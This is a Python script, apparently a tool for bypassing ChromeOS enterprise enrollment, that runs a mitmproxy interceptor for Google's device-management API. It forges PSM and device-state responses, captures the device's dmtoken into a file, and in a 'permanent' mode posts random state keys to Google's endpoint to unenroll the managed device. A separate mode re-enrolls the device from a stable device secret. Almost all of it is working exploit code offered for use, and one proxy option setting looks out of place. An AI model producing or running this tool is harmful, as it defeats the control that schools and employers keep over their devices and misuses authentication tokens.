import argparse
import asyncio
import hashlib
import hmac
import logging
import os
import struct
import sys
import threading
import time
import requests

from pathlib import Path

from mitmproxy import http
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster

from dmbackend import device_management_backend_pb2 as proto

args = argparse.ArgumentParser()
args.add_argument("-p", "--permanent", action="store_true", help="permanent unenrollment mode")
args.add_argument("-e", "--enroll", action="store_true", help="re enroll the device with the stable device secret")
args.add_argument("-v", "--verbose", action="store_true", help="enable mitmproxy verbose logging")
args = args.parse_args()

class DMProxy:
    def __init__(self, master, permanent: bool = False) -> None:
        self.master = master
        self.permanent = permanent
        self.psm_response = (Path(__file__).resolve().parent / "payload" / "psm_response.bin").read_bytes()
        self.unenroll_started = False

    def request(self, flow: http.HTTPFlow) -> None:
        if "/devicemanagement/" not in flow.request.path:
            return

        req_type = flow.request.query.get("request")

        if not self.permanent and req_type == "enterprise_psm_check":
            flow.response = http.Response.make(
                200, self.psm_response,
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] sent crafted psm response to client")
            return

        if req_type == "device_state_retrieval":
            response = proto.DeviceManagementResponse()
            response.device_state_retrieval_response.restore_mode = 0 if not self.permanent else 4

            payload = response.SerializeToString()
            flow.response = http.Response.make(
                200, payload,
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] sent crafted device state retrieval response")
            return

        if self.permanent and req_type == "policy":
            if self.unenroll_started:
                return

            self.unenroll_started = True
            dmtoken = flow.request.headers["Authorization"].split("token=")[1]
            deviceid = flow.request.query.get("deviceid")

            print(f"[proxy] got dmtoken: {dmtoken}")
            Path("dmtoken.txt").write_text(f"{deviceid}:{dmtoken}")

            def do_unenroll():
                print("[proxy] waiting 1 minute before sending state key update...")
                time.sleep(60)

                policy_fetch_request = proto.PolicyFetchRequest()
                policy_fetch_request.policy_type = "google/chromeos/device"

                request = proto.DeviceManagementRequest()
                request.policy_request.requests.append(policy_fetch_request)
                request.device_state_key_update_request.server_backed_state_keys.extend(os.urandom(32) for _ in range(5))

                response = requests.post(
                    f"https://m.google.com/devicemanagement/data/api?apptype=Chrome&deviceid={deviceid}&devicetype=2&request=policy",
                    headers={
                        "Authorization": f"GoogleDMToken token={dmtoken}",
                        "Content-Type": "application/protobuf",
                    },
                    data=request.SerializeToString(),
                )

                data = proto.DeviceManagementResponse()
                data.ParseFromString(response.content)

                if data.error_message:
                    print(f"unenrollment failed: {data.error_message}")
                    return

                print(f"successfully unenrolled device {deviceid}")
                print("[proxy] you may now powerwash the device")
                self.master.shutdown()

            threading.Thread(target=do_unenroll, daemon=True).start()

if args.enroll:
    dmtoken_file = Path("dmtoken.txt")

    if dmtoken_file.exists():
        deviceid, dmtoken = dmtoken_file.read_text().strip().split(":")
    else:
        deviceid = input("deviceid: ").strip()
        dmtoken = input("dmtoken: ").strip()

    secret_bytes = bytes.fromhex(input("stable device secret: ").strip())
    if len(secret_bytes) < 32:
        sys.exit("please provide a valid stable device secret")

    quantum_size = 1 << 23
    quantized_time = int(time.time()) & ~(quantum_size - 1)
    keys = []
    for _ in range(5):
        keys.append(hmac.new(secret_bytes, b"server_backed_state_keys\x00" + struct.pack("<q", quantized_time), hashlib.sha256).digest())
        quantized_time += quantum_size

    policy_fetch_request = proto.PolicyFetchRequest()
    policy_fetch_request.policy_type = "google/chromeos/device"

    request = proto.DeviceManagementRequest()
    request.policy_request.requests.append(policy_fetch_request)
    request.device_state_key_update_request.server_backed_state_keys.extend(keys)

    response = requests.post(
        f"https://m.google.com/devicemanagement/data/api?apptype=Chrome&deviceid={deviceid}&devicetype=2&request=policy",
        headers={
            "Authorization": f"GoogleDMToken token={dmtoken}",
            "Content-Type": "application/protobuf",
        },
        data=request.SerializeToString(),
    )

    data = proto.DeviceManagementResponse()
    data.ParseFromString(response.content)

    if data.error_message:
        print(f"failed to re enroll the device: {data.error_message}")
    else:
        print(f"successfully re enrolled device {deviceid}")

    sys.exit()

async def main():
    opts = Options(allow_hosts=["m.google.com"])
    master = DumpMaster(opts, with_termlog=args.verbose, with_dumper=args.verbose)
    master.addons.add(DMProxy(master, permanent=args.permanent))

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    opts.update(emudhra=True)

    print("[proxy] listening at *:8080")
    await master.run()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
